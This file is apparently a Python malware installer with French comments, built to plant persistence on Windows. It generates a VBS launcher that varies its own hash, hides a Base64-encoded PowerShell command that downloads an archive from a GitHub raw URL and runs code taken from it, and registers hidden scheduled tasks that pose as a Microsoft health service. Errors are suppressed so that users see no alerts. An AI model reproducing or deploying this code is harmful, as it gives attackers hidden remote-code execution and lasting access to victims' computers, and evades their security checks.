# -*- coding: utf-8 -*-
import os
import sys
import random
import string
import shutil
import subprocess
import datetime

# ==============================================================================
# PLACEHOLDERS - Remplis automatiquement par le script builder.py
# ==============================================================================
APP_FOLDER_NAME    = "WindowsSystemHealth"
VBS_NAME           = "LaunchSystemCheck.vbs"
EXE_NAME           = "health_monitor.exe"
WORKER_SCRIPT_NAME = "monitor.py"
TASK_MAIN_NAME     = "WindowsSystemHealthCheck"
TASK_WORKER_NAME   = "WindowsSystemHealthMonitor"
NEW_ENCODED_PS_B64 = "JABXAG8AcgBrAEQAaQByACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACAAIgBXAGkAbgBkAG8AdwBzAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoACIACgAkAFUAcABkAGEAdABlAEQAaQByACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABXAG8AcgBrAEQAaQByACAAIgBVAHAAZABhAHQAZQBUAGUAbQBwACIACgBpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAVQBwAGQAYQB0AGUARABpAHIAKQApACAAewAgAE4AZQB3AC0ASQB0AGUAbQAgACQAVQBwAGQAYQB0AGUARABpAHIAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsACAAfQAKAAoAJABHAGkAdABIAHUAYgBVAFIATAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYwBoAGUAaQBrAGgAbwB1AGQAaQBlAG4AZwAvAHMAZQBjAHUAcgBpAHQAeQAtAGMAZQByAHQAcwAtAHUAcABkAGEAdABlAHMALwByAGEAdwAvAG0AYQBpAG4ALwBzAGUAYwB1AHIAaQB0AHkALQBjAGUAcgB0AHMALQB1AHAAZABhAHQAZQBzAC4AZABhAHQAIgAKACQARgBpAG4AYQBsAEYAbwBsAGQAZQByAFAAYQB0AGgAIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFcAbwByAGsARABpAHIAIAAiAEwAYQB0AGUAcwB0AF8AQwBlAHIAdABzAF8ARABhAHQAYQAiAAoAJABaAGkAcABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFcAbwByAGsARABpAHIAIAAiAHMAeQBzAF8AdQBwAGQAYQB0AGUALgB6AGkAcAAiAAoACgB0AHIAeQAgAHsACgAgACAAIAAgAEkAbQBwAG8AcgB0AC0ATQBvAGQAdQBsAGUAIABCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAKACAAIAAgACAAUwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJABHAGkAdABIAHUAYgBVAFIATAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAJABaAGkAcABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAtAFAAcgBpAG8AcgBpAHQAeQAgAEYAbwByAGUAZwByAG8AdQBuAGQAIAAtAEQAaQBzAHAAbABhAHkATgBhAG0AZQAgACIAUwB5AHMAdABlAG0AVQBwAGQAYQB0AGUAIgAKAAoAIAAgACAAIABpAGYAIAAoAFQAZQBzAHQALQBQAGEAdABoACAAJABGAGkAbgBhAGwARgBvAGwAZABlAHIAUABhAHQAaAApACAAewAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQARgBpAG4AYQBsAEYAbwBsAGQAZQByAFAAYQB0AGgAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEYAbwByAGMAZQAgAH0ACgAgACAAIAAgAEUAeABwAGEAbgBkAC0AQQByAGMAaABpAHYAZQAgAC0AUABhAHQAaAAgACQAWgBpAHAARABlAHMAdABpAG4AYQB0AGkAbwBuACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AUABhAHQAaAAgACQARgBpAG4AYQBsAEYAbwBsAGQAZQByAFAAYQB0AGgAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJABaAGkAcABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAtAEYAbwByAGMAZQAKAAoAIAAgACAAIAAkAFAAeQB0AGgAbwBuAEUAeABlACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABGAGkAbgBhAGwARgBvAGwAZABlAHIAUABhAHQAaAAgACIAaABlAGEAbAB0AGgAXwBtAG8AbgBpAHQAbwByAC4AZQB4AGUAIgAKACAAIAAgACAAJABJAG4AcwB0AGEAbABsAFMAYwByAGkAcAB0ACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABGAGkAbgBhAGwARgBvAGwAZABlAHIAUABhAHQAaAAgACIAcwBlAHQAdQBwAC4AcAB5ACIACgAKACAAIAAgACAAaQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAUAB5AHQAaABvAG4ARQB4AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AIAAkAEYAaQBuAGEAbABGAG8AbABkAGUAcgBQAGEAdABoAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAEkAbgBzAHQAYQBsAGwAUwBjAHIAaQBwAHQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAFAAeQB0AGgAbwBuAEMAbwBkAGUAIAA9ACAARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABJAG4AcwB0AGEAbABsAFMAYwByAGkAcAB0ACAALQBSAGEAdwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQASQBuAHMAdABhAGwAbABTAGMAcgBpAHAAdAAgAC0ARgBvAHIAYwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABQAHkAdABoAG8AbgBDAG8AZABlACAAfAAgACYAIAAkAFAAeQB0AGgAbwBuAEUAeABlACAALQAgACIATgBvAG4AZQAiAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0ACgB9ACAAYwBhAHQAYwBoACAAewB9AA=="

# Configuration des chemins locaux
LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
INSTALL_DIR    = os.path.join(LOCAL_APP_DATA, APP_FOLDER_NAME)

# Chemins dynamiques basés sur le dossier d'extraction actuel (ex: Bureau)
CURRENT_DIR        = os.getcwd()
EXE_PATH           = os.path.join(CURRENT_DIR, EXE_NAME)
WORKER_SCRIPT_PATH = os.path.join(CURRENT_DIR, WORKER_SCRIPT_NAME)

def get_random_string(length=12):
    """Génère une chaîne aléatoire pour le polymorphisme du fichier VBS."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_polymorphic_vbs(encoded_command):
    """Crée le contenu du lanceur VBS avec du code aléatoire pour changer son Hash."""
    junk_comment = get_random_string(40)
    junk_var = get_random_string(8)
    
    content = f"""' Signature: {junk_comment}
Option Explicit
Dim {junk_var}
Set {junk_var} = CreateObject("WScript.Shell")
{junk_var}.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_command}", 0, False
' ID: {get_random_string(8)}
"""
    return content

def get_iso_timestamp_plus_1min():
    """Retourne un timestamp au format ISO 8601 requis par l'API COM de Windows."""
    future = datetime.datetime.now() + datetime.timedelta(minutes=1)
    return future.strftime("%Y-%m-%dT%H:%M:%S")

def manage_task_via_com(task_name, executable_path, arguments, interval_minutes):
    """
    Crée ou répare une tâche planifiée en utilisant l'API COM (Schedule.Service).
    Cette méthode est plus discrète et résiliente que schtasks.exe.
    """
    duration_iso = f"PT{interval_minutes}M"
    start_time   = get_iso_timestamp_plus_1min()
    
    # Nettoyage des chemins pour éviter les erreurs d'échappement dans le script VBS temporaire
    exe_clean = executable_path.replace("\\", "\\\\")
    arg_clean = arguments.replace('"', '').replace("\\", "\\\\")
    
    # Script VBS temporaire pour piloter l'objet COM Schedule.Service
    vbs_com_script = f"""
Set service = CreateObject("Schedule.Service")
service.Connect()
Set rootFolder = service.GetFolder("\\")

On Error Resume Next
rootFolder.DeleteTask "{task_name}", 0
On Error GoTo 0

Set taskDef = service.NewTask(0)
taskDef.RegistrationInfo.Author = "Microsoft Corporation"
taskDef.RegistrationInfo.Description = "Windows System Health Maintenance Service"

Set settings = taskDef.Settings
settings.Enabled = True
settings.Hidden = True
settings.StartWhenAvailable = True
settings.DisallowStartIfOnBatteries = False
settings.StopIfGoingOnBatteries = False
settings.ExecutionTimeLimit = "PT0S"
settings.Priority = 7

Set trigger = taskDef.Triggers.Create(1) ' 1 = TimeTrigger
trigger.StartBoundary = "{start_time}"
trigger.Repetition.Interval = "{duration_iso}"
trigger.Enabled = True

Set action = taskDef.Actions.Create(0) ' 0 = ExecAction
action.Path = "{exe_clean}"
action.Arguments = chr(34) & "{arg_clean}" & chr(34)

' Flag 6 = CreateOrUpdate
rootFolder.RegisterTaskDefinition "{task_name}", taskDef, 6, Null, Null, 3
"""
    # Création du dossier d'installation si absent
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)

    temp_vbs_path = os.path.join(INSTALL_DIR, f"tmp_task_{get_random_string(5)}.vbs")
    
    try:
        with open(temp_vbs_path, "w", encoding="utf-8") as f:
            f.write(vbs_com_script)
        
        # Exécution du script VBS de configuration via wscript.exe
        subprocess.run(["wscript.exe", temp_vbs_path], capture_output=True, shell=True)
        
        # Nettoyage immédiat du script temporaire
        os.remove(temp_vbs_path)
    except Exception:
        pass

def persist_files():
    """Vérifie l'existence des dossiers et retourne les chemins d'exécution."""
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)
        
    return EXE_PATH, WORKER_SCRIPT_PATH

def main():
    # 1. Préparation des chemins
    final_exe_path, final_worker_path = persist_files()

    # 2. Polymorphisme : Régénération du lanceur VBS dans AppData
    vbs_path = os.path.join(INSTALL_DIR, VBS_NAME)
    new_vbs_content = generate_polymorphic_vbs(NEW_ENCODED_PS_B64)
    
    try:
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(new_vbs_content)
    except Exception:
        pass

    # 3. Création / Mise à jour de la Tâche Principale (60 minutes)
    # Elle lance le VBS polymorphe situé dans AppData
    manage_task_via_com(
        task_name=TASK_MAIN_NAME,
        executable_path="wscript.exe",
        arguments=vbs_path,
        interval_minutes=60
    )

    # 4. Création / Mise à jour de la Tâche de Surveillance (2 minutes)
    # Elle lance directement l'exécutable Python avec le script worker.py
    manage_task_via_com(
        task_name=TASK_WORKER_NAME,
        executable_path=final_exe_path,
        arguments=final_worker_path,
        interval_minutes=2
    )

if __name__ == "__main__":
    try:
        main()
    except Exception:
        # Échec silencieux pour éviter les alertes utilisateur
        sys.exit(0)